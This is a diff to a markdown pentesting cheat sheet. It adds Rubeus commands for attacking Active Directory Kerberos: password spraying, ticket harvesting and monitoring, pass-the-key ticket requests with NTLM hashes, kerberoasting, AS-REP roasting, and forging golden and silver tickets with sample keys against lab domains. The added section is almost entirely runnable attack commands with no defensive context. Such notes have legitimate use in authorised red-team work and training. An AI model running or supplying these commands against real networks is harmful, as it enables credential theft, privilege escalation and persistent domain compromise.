@@ -444,27 +444,45 @@ misc::skeleton
 # Rubeus
 https://www.hackingarticles.in/a-detailed-guide-on-rubeus/
 
+#### Basic
 Brute Password spray:
 
 ```Rubeus.exe brute /password:Password01 /noticket```
 
-
 Get tickets currently on System:
+- All - ```Rubeus.exe harvest /interval:30```
+- Specific User - ```rubeus.exe monitor /targetuser:Mary /interval:10 /nowrap```
 
-All - ```Rubeus.exe harvest /interval:30```
-
-Specific User - ```rubeus.exe monitor /targetuser:Mary /interval:10 /nowrap```
-
-
+#### Pass-the-key/Over-PTH
 Request ticket (TGT) based on username and password/hash:
-
 ```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
 
 Request Service ticket (TGS) based on Service Name:
-
 ```rubeus.exe asktgs /user:admin /ticket:doIDF== /service:LDAP/dc1.ecorp.lab```
 
+#### Roasting
+```Rubeus.exe kerberoast /nowrap```
+- [Full kerberoast]()
 
+```Rubeus.exe asreproast /nowrap```
+- [Full aseproast]()
+
+#### Golden/Silver
+Hash of a user:
+```rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1```
+
+Golden:
+```rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:FakeUser123 /printcmd```
+
+Silver:
+```rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt```
+
+#### Maintenance
+```rubeus.exe purge```
+
+```rubeus.exe describe```
+
+```rubeus.exe triage```
 
 # Check ACLs
 Check Domain Admins permissions for a specific user:
